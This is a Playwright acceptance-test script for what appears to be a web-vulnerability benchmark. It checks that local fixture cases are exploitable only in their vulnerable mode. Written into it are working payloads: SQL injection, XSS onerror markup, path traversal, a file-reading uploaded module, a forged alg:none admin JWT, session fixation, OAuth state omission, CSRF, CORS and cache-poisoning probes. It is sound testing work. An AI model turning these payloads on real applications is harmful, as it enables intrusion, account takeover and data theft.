import assert from 'node:assert/strict';
import {mkdir,writeFile} from 'node:fs/promises';
import {chromium} from 'playwright-core';
import {cases} from '../src/catalog.mjs';
import {checks as backendChecks} from './backend-cases.mjs';
import {checks as workflowChecks} from './workflow-cases.mjs';
import {checks as configurationChecks} from './configuration-cases.mjs';
import {checks as quotaChecks} from './resource-quotas.mjs';
import {checks as dataHandlingChecks} from './data-handling.mjs';
import {checks as contentBoundaryChecks} from './content-boundaries.mjs';
import {checks as batchAuthChecks} from './batch-auth.mjs';
import {checks as batchAuthorizationChecks} from './batch-authorization.mjs';
import {checks as batchBoundaryChecks} from './batch-boundaries.mjs';
import {checks as batch2BrowserChecks} from './batch2-browser.mjs';
import {checks as batch2WorkflowChecks} from './batch2-workflows.mjs';
import {checks as batch2StorageChecks} from './batch2-storage.mjs';
import {checks as batch3LifecycleChecks} from './batch3-lifecycle.mjs';
import {checks as batch3ProtocolChecks} from './batch3-protocols.mjs';
import {checks as batch3EngineChecks} from './batch3-engines-acceptance.mjs';
import {definitions as caseDefinitions} from '../src/cases/index.mjs';
import {sourceSnapshot,compareSources,runtimeSourceProof,compareRuntimeSourceProof} from '../src/reporting/source.mjs';
const target=process.env.TARGET_URL||'https://app:8443';
const attacker=process.env.ATTACKER_URL||'https://app:8444';
const control=process.env.CONTROL_URL||'http://app:8099';
const key=process.env.BENCHMARK_CONTROL_KEY;
if(!key)throw new Error('Use verify.ps1 or verify.sh to supply the private control key.');
const requestedRoots=process.env.BENCHMARK_TEST_ROOT?.split(',').map(value=>value.trim());
if(requestedRoots&&(requestedRoots.some(root=>!cases.some(item=>item.root===root))||new Set(requestedRoots).size!==requestedRoots.length))throw new Error('Acceptance root selection contains an unknown or duplicate root.');
const outputName=process.env.BENCHMARK_ACCEPTANCE_OUTPUT||'acceptance.json';
if(!/^(?:acceptance|acceptance-saved-[A-Za-z0-9-]+)\.json$/.test(outputName))throw new Error('Acceptance output must be a filename under artifacts.');
const selectedCases=cases.filter(item=>!requestedRoots||requestedRoots.includes(item.root));
async function ctl(endpoint,data) {
  const result=await fetch(control+endpoint,{method:data?'POST':'GET',headers:{'x-benchmark-key':key,'content-type':'application/json'},...(data?{body:JSON.stringify(data)}:{})});
  assert.equal(result.status,200,'Private control call failed');return result.json();
}
const source=await sourceSnapshot('.',{designPath:'../benchmark-design-v2.json'});
const targetRuntimeSource={verifier:await runtimeSourceProof('.'),targetBefore:await ctl('/source-proof')};
targetRuntimeSource.verifierMatch=compareRuntimeSourceProof(targetRuntimeSource.verifier,targetRuntimeSource.targetBefore);
if(targetRuntimeSource.verifierMatch.status!=='matched')throw new Error('Verifier and target runtime source differ before acceptance');
const browser=await chromium.launch({executablePath:'/usr/bin/chromium',headless:true,args:['--no-sandbox']});
const report={schema:'benchmark-acceptance-0.2',started:new Date().toISOString(),platform:process.platform,arch:process.arch,node:process.version,browser:browser.version(),seed:'acceptance-v1',source,targetRuntimeSource,scope:`${selectedCases.length} representative variants; V/F/N; acceptance, not scanner measurement`,results:[]};
const negatives={R0001:'Quoted text is handled as a search value',R0021:'HTML-looking input remains visible text',R0041:'Hash containing markup remains visible text',R0124:'Legitimate public file remains readable',R0141:'Script-looking upload is a downloadable attachment',R0182:'Valid member credentials still authenticate',R0201:'A legitimately delivered reset token works',R0221:'A pre-login session can enter a legitimate login workflow',R0241:'A legitimately signed administrator JWT works',R0251:'A matching OAuth state completes login',R0271:'Intentionally shared document is readable across owners',R0291:'Administrator can perform the management action',R0311:'An authenticated same-origin form with token works',R0332:'Authenticated same-origin API data remains readable',R0380:'An uncached diagnostic error is distinct from the public news response',R0391:'A purchase at the server price succeeds'};
let failed=0;
try {
  for(const item of selectedCases)for(const mode of ['V','F','N']) {
    const started=Date.now();const record={root:item.root,variant:item.variant,mode,checks:[],requests:0};
    const context=await browser.newContext({ignoreHTTPSErrors:!(['R0477','R0453'].includes(item.root)||caseDefinitions.find(definition=>definition.root===item.root)?.requiresTrustedTLS)});
    context.on('request',()=>record.requests++);
    const page=await context.newPage();
    try {
      const m=await ctl('/reset',{root:item.root,mode,seed:'acceptance-v1'});const base=target+m.base;
      const before=await ctl('/oracle');const v=mode==='V';
      const check=(condition,label)=>{assert.ok(condition,label);record.checks.push(label);};
      const get=async(s,options={})=>{record.requests++;return context.request.get(base+s,options);};
      const post=async(s,data,options={})=>{record.requests++;return context.request.post(base+s,{data,...options});};
      const login=async(name='alice')=>{const fields=caseDefinitions.find(definition=>definition.root===item.root)?.loginFields||{};const data={username:name,password:'Fixture-'+name+'-2026!'};for(const [field,hint] of Object.entries(fields)){if(field!=='csrf'||hint!=='from-session')throw new Error('Unsupported normal login extraction');const sessionResponse=await get('/session');data.csrf=(await sessionResponse.json()).csrf;}const response=await context.request.post(target+m.login,{data});record.requests++;check(response.status()===200,'Normal login succeeds');};
      const oracle=()=>ctl('/oracle');
      const c=before.canary;
      check((await context.request.get(target+'/control/oracle')).status()===404,'Public listener does not expose oracle');
      const homepage=await context.request.get(target+'/');const home=await homepage.text();check(!home.includes(item.root)&&!home.includes(c),'Homepage has no case label or private canary');
      const schema=await (await get('/openapi.json')).json();check(schema.openapi==='3.0.3'&&Object.values(schema.paths).some(p=>p.post),'OpenAPI includes normal POST operations');
      check(schema.paths[m.login]?.post&&schema.paths[m.logout]?.post&&home.includes('href="'+m.login+'"'),'Normal auth paths agree across manifest, navigation and schema');
      if(['R0243','R0244','R0246'].includes(item.root))check(m.extractions.bearer==='GET access-pass -> token','Bearer extraction points to the implemented issuer');
      check(!JSON.stringify(schema).includes(item.root)&&!JSON.stringify(m).includes(c),'Scanner inputs omit labels and private truth');
      switch(item.root) {
        case 'R0001': {
          const normal=await get('/search?q=Apple');check(normal.status()===200&&(await normal.text()).includes('Apple'),'Normal search');
          const attack=await get('/search?q='+encodeURIComponent("' OR secret=true --"));check((await attack.text()).includes(c)===v,'Actual PostgreSQL protected-row exposure agrees with arm');
          if(mode==='N'){const safe=await get('/search?q='+encodeURIComponent("O'Reilly"));check(safe.status()===200,'Quote in search value is data');}
          break;
        }
        case 'R0021': {
          await page.goto(base+'/message?text=Hello');check(await page.locator('#message').textContent()==='Hello','Normal message rendering');
          const payload='<img src=x onerror="document.body.dataset.executed=\'yes\'">';
          await page.goto(base+'/message?text='+encodeURIComponent(payload));await page.waitForTimeout(200);
          check((await page.locator('body').getAttribute('data-executed')==='yes')===v,'Browser executes reflected payload only in V');
          if(!v)check((await page.locator('#message').textContent())===payload,'Markup-looking text preserved');break;
        }
        case 'R0041': {
          await page.goto(base+'/preview#Hello');check(await page.locator('#preview').textContent()==='Hello','Normal hash rendering');
          const payload='<img src=x onerror="document.body.dataset.executed=\'yes\'">';await page.goto(base+'/preview#'+encodeURIComponent(payload));await page.waitForTimeout(200);
          check((await page.locator('body').getAttribute('data-executed')==='yes')===v,'Browser executes DOM payload only in V');if(!v)check(await page.locator('#preview').textContent()===payload,'DOM treats markup as text');break;
        }
        case 'R0124': {
          check((await (await get('/files?name=public%2Freadme.txt')).text())==='Public user guide','Normal filesystem read');
          const response=await get('/files?name='+encodeURIComponent('private\\report.txt'));check((await response.text()).includes(c)===v,'Real private file read through separator mismatch agrees with arm');break;
        }
        case 'R0141': {
          await login();const source="console.log('Hello extension')";check((await post('/extensions',{name:'hello',source})).status()===200,'Normal upload stored');
          const normal=await get('/extensions/hello');check(normal.status()===200&&(await normal.text()).includes('Hello extension'),'Normal uploaded content is usable');
          const payload="import {readFileSync} from 'node:fs';console.log(readFileSync('/tmp/execution-fixture/private-canary.txt','utf8'));";
          await post('/extensions',{name:'probe',source:payload});const response=await get('/extensions/probe');check((await response.text()).includes(c)===v,'Actual Node module execution canary agrees with arm');
          if(!v)check(response.headers()['content-disposition']==='attachment','Script-looking upload is served as attachment');break;
        }
        case 'R0182': {
          await login();await post('/logout',{});const response=await post('/login',{username:'bob',password:'invalid-password'});
          check((response.status()===200)===v,'Invalid credentials admission agrees with arm');const state=await (await get('/session')).json();check((state.username==='bob')===v,'Authentication creates actual Bob session only in V');break;
        }
        case 'R0201': {
          await post('/recovery',{username:'alice'});await post('/recovery',{username:'bob'});const mail=await ctl('/mail/alice');check(mail.length===1,'Normal recovery sends Alice mail to private inbox');
          const observed=mail[0].token;const guessed=/^\d+$/.test(observed)?String(Number(observed)+1):'4102';await post('/reset',{token:guessed,password:'Changed-bob-2026!'});
          const state=await oracle();check((state.users.find(u=>u.name==='bob').password==='Changed-bob-2026!')===v,'Predicted token changes actual Bob password only in V');
          check((await post('/reset',{token:observed,password:'Changed-alice-2026!'})).status()===200,'Legitimately delivered token changes Alice password');
          check((await post('/reset',{token:observed,password:'Changed-alice-again!'})).status()===400,'Reset token is single use');break;
        }
        case 'R0221': {
          await get('/session');const original=(await context.cookies(target)).find(c=>c.name==='sid');check(!!original,'Normal pre-login session issued');
          const victim=await browser.newContext({ignoreHTTPSErrors:true});try{
            await victim.addCookies([original]);const response=await victim.request.post(base+'/login',{data:{username:'alice',password:'Fixture-alice-2026!'}});check(response.status()===200,'Victim normal login');
            const attackerState=await (await get('/session')).json();check((attackerState.username==='alice')===v,'Attacker old session gains victim identity only in V');
            const renewed=(await victim.cookies(target)).find(c=>c.name==='sid');check((renewed.value===original.value)===v,'Post-login identifier rotation agrees with arm');
          }finally{await victim.close();}break;
        }
        case 'R0241': {
          await login('admin');const signed=(await (await get('/token')).json()).token;check((await get('/member-api',{headers:{authorization:'Bearer '+signed}})).status()===200,'Signed administrator token works');
          const header=Buffer.from(JSON.stringify({alg:'none',typ:'JWT'})).toString('base64url');const body=Buffer.from(JSON.stringify({sub:'alice',role:'admin',iss:'fixture-idp',aud:'member-api',exp:Math.floor(Date.now()/1000)+600})).toString('base64url');
          const response=await get('/member-api',{headers:{authorization:'Bearer '+header+'.'+body+'.'}});check((await response.text()).includes(c)===v,'Unsigned JWT exposes private report only in V');break;
        }
        case 'R0251': {
          const begin=await get('/connect',{maxRedirects:0});const state=new URL(begin.headers().location,target).searchParams.get('state');
          const auth=await post('/idp/authorize',{username:'alice',password:'Fixture-alice-2026!',state},{maxRedirects:0});const callback=auth.headers().location;check((await context.request.get(target+callback)).status()===200,'OAuth matching state completes login');
          await post('/logout',{});await get('/connect',{maxRedirects:0});
          const codeResponse=await post('/idp/authorize',{username:'bob',password:'Fixture-bob-2026!'},{maxRedirects:0});const response=await context.request.get(target+codeResponse.headers().location);check((response.status()===200)===v,'Missing-state callback admission agrees with arm');
          check(((await (await get('/session')).json()).username==='bob')===v,'Victim session becomes attacker account only in V');break;
        }
        case 'R0271': {
          await login();check((await get('/documents/101')).status()===200,'Own document readable');const response=await get('/documents/102');check((await response.text()).includes(c)===v,'Other-owner private document exposure agrees with arm');
          const other=await get('/documents/103');check((await other.text()).includes(c)===v,'Other-tenant private document exposure agrees with arm');check((await get('/documents/104')).status()===200,'Intentionally shared document readable');break;
        }
        case 'R0291': {
          await login('admin');check((await post('/management',{action:'rebuild-report'})).status()===200,'Administrator normal management action');await post('/logout',{});await login();
          await post('/management',{action:'rebuild-report'});const state=await oracle();check(state.operations.some(o=>o.username==='alice')===v,'Ordinary member performs actual admin action only in V');break;
        }
        case 'R0311': {
          await login();const s=await (await get('/session')).json();check((await post('/profile',{contact:'normal@example.test',csrf:s.csrf})).status()===200,'Normal authenticated token-bearing contact update');
          await page.goto(attacker+'/csrf?target='+encodeURIComponent(base+'/profile'));await page.waitForTimeout(300);const state=await oracle();check((state.users.find(u=>u.name==='alice').contact==='changed@example.test')===v,'Real cross-origin form changes victim contact only in V');break;
        }
        case 'R0332': {
          const evidence=[];page.on('console',msg=>evidence.push({type:msg.type(),message:msg.text()}));
          page.on('requestfailed',req=>evidence.push({url:req.url(),failure:req.failure()}));
          page.on('response',async response=>{if(response.url().includes('/integration-data')){const h=await response.request().allHeaders();evidence.push({status:response.status(),origin:h.origin,cookieSent:!!h.cookie,allowOrigin:response.headers()['access-control-allow-origin']});}});
          await login();check((await get('/integration-data')).status()===200,'Normal same-origin private API read');
          await page.goto(attacker+'/cors?cookies=default&target='+encodeURIComponent(base+'/integration-data'));
          await page.waitForFunction(()=>document.getElementById('result').textContent!=='waiting',null,{timeout:5000});
          const defaultResult=await page.locator('#result').textContent();check(!defaultResult.includes(c),'Default sandbox does not expose authenticated private data in this browser');
          record.browserCondition={sameSite:'None',secure:true,sandbox:'allow-scripts allow-same-site-none-cookies',relationship:'same-site, different-port origins',defaultSandboxResult:defaultResult};
          await page.goto(attacker+'/cors?target='+encodeURIComponent(base+'/integration-data'));
          await page.waitForFunction(()=>document.getElementById('result').textContent!=='waiting',null,{timeout:5000});const result=await page.locator('#result').textContent();record.corsEvidence={result,evidence};check(result.includes(c)===v,'Real null-origin sandbox reads credentialed response only in V');
          if(!v)check(result.includes('blocked'),'Browser prevents attacker reading fixed response');break;
        }
        case 'R0380': {
          const documented=m.requests.find(request=>request.method==='GET'&&request.path===m.base+'/news');
          check(documented?.headers?.['X-News-Preview']==='', 'Public manifest declares the optional preview header without activating it');
          const specification=await (await get('/openapi.json')).json();
          check(specification.paths[m.base+'/news'].get.parameters.some(parameter=>parameter.in==='header'&&parameter.name==='X-News-Preview'&&parameter.example===''), 'Public OpenAPI exposes the optional preview header to both scanners');
          const normal=await get('/news');check(normal.status()===200,'Normal public news response');
          const bad=await get('/news',{headers:{'x-news-preview':'preview-probe'}});check(bad.status()===503,'Diagnostic error actually generated');const clean=await get('/news');check((clean.status()===503&&(await clean.text()).includes('preview-probe'))===v,'Redis shared cache poisoning agrees with arm');if(!v)check(clean.status()===200,'Healthy response survives diagnostic error');break;
        }
        case 'R0391': {
          await login();const normal=await post('/shop',{product:'book',price:1000});check((await normal.json()).charged===1000,'Normal purchase charges real price');
          const response=await post('/shop',{product:'book',price:1});check((await response.json()).charged===(v?1:1000),'Client price acceptance agrees with arm');const state=await oracle();check(state.users.find(u=>u.name==='alice').balance===(v?1999:1000),'Actual balance decrement agrees with arm');break;
        }
        default:{const external=backendChecks[item.root]||workflowChecks[item.root]||configurationChecks[item.root]||quotaChecks[item.root]||dataHandlingChecks[item.root]||contentBoundaryChecks[item.root]||batchAuthChecks[item.root]||batchAuthorizationChecks[item.root]||batchBoundaryChecks[item.root]||batch2BrowserChecks[item.root]||batch2WorkflowChecks[item.root]||batch2StorageChecks[item.root]||batch3LifecycleChecks[item.root]||batch3ProtocolChecks[item.root]||batch3EngineChecks[item.root];if(!external)throw new Error('Uncovered root');await external({ctl,context,page,base,target,attacker,get,post,login,oracle,check,v,c,mode,record});}
      }
      if(mode==='N')record.hardNegative=negatives[item.root]||caseDefinitions.find(entry=>entry.root===item.root)?.negativeDescription;
      const denied=await fetch(control+'/oracle');check(denied.status===403,'Private listener rejects missing key');
      // Restore every persistence layer and assert normal seed state, not just a reset ACK.
      await ctl('/reset',{root:item.root,mode,seed:'acceptance-v1'});const after=await oracle();
      check(after.canary===before.canary,'Canary is stable across arms/reset within this app session');
      check(JSON.stringify(after.users)===JSON.stringify(before.users)&&after.orders.length===0&&after.operations.length===0,'Reset restores exact initial account state and clears orders/operations');
      check((await (await get('/session')).json()).username===null,'Reset invalidates Redis sessions');
      check((await ctl('/mail/alice')).length===0,'Reset clears private mail');
      if(item.root==='R0141'){await login();check((await get('/extensions/probe')).status()===404,'Reset removes uploaded executable and attachment');}
      if(item.root==='R0380')check((await get('/news')).status()===200,'Reset removes poisoned Redis cache entry');
      if(item.root==='R0455')for(const name of ['alice','bob','carol','approver','admin'])check((await get('/generated-report/'+name+'.txt')).status()===404,'Reset removes generated file for '+name+' from public and private storage');
      if(['R0457','R0458'].includes(item.root))check(after.caseState.collector.analytics.length===0&&after.caseState.collector.error.length===0,'Reset clears both real collector event stores');
      if(item.root==='R0001'&&mode==='V'){
        await ctl('/measurement/start',{});
        try {
          await get('/search?q=Apple');
          const malformed=await context.request.post(base+'/login',{headers:{'content-type':'application/json'},data:'{'});
          check(malformed.status()===400,'Malformed request body is rejected');
          await context.request.get(target+'/health');
          const deniedReset=await fetch(control+'/reset',{method:'POST',headers:{'x-benchmark-key':key,'content-type':'application/json'},body:JSON.stringify({root:item.root,mode,seed:'acceptance-v1'})});
          check(deniedReset.status===400,'Active measurement prevents reset');
          const measured=await ctl('/measurement');
          check(measured.count===2&&measured.byMethod.GET===1&&measured.byMethod.POST===1,'Ingress count includes malformed body and excludes health/control traffic');
          check(measured.activeRequests===0&&measured.openRequests===0&&measured.pendingHandlers===0&&measured.peakActive>=1,'Completed requests leave no active response or handler');
        } finally {await ctl('/measurement/stop',{});}
        const stopped=await ctl('/measurement');await get('/search?q=Apple');
        check((await ctl('/measurement')).count===stopped.count&&!stopped.active,'Stopped measurement remains frozen');
      }
      record.passed=true;
    } catch(error) {record.passed=false;record.error=error.message;failed++;}
    finally {record.durationMs=Date.now()-started;await context.close();report.results.push(record);console.log(`${record.passed?'PASS':'FAIL'} ${item.root}/${item.variant} ${mode} ${record.checks.length} checks${record.error?' '+record.error:''}`);}
  }
} finally {
  await browser.close();report.finished=new Date().toISOString();report.summary={cells:report.results.length,passed:report.results.filter(r=>r.passed).length,failed,checks:report.results.reduce((n,r)=>n+r.checks.length,0)};
  try{report.sourceAfter=compareSources(source,await sourceSnapshot('.',{designPath:'../benchmark-design-v2.json'}));}
  catch(error){report.sourceAfter={status:'unavailable',reason:error.message};}
  try{targetRuntimeSource.targetAfter=await ctl('/source-proof');targetRuntimeSource.targetMatch=compareRuntimeSourceProof(targetRuntimeSource.targetBefore,targetRuntimeSource.targetAfter);}
  catch(error){targetRuntimeSource.targetMatch={status:'unavailable',reason:error.message};}
  await mkdir('artifacts',{recursive:true});await writeFile('artifacts/'+outputName,JSON.stringify(report,null,2));console.log(JSON.stringify(report.summary));
}
if(failed||report.sourceAfter.status!=='matched'||targetRuntimeSource.targetMatch.status!=='matched')process.exitCode=1;
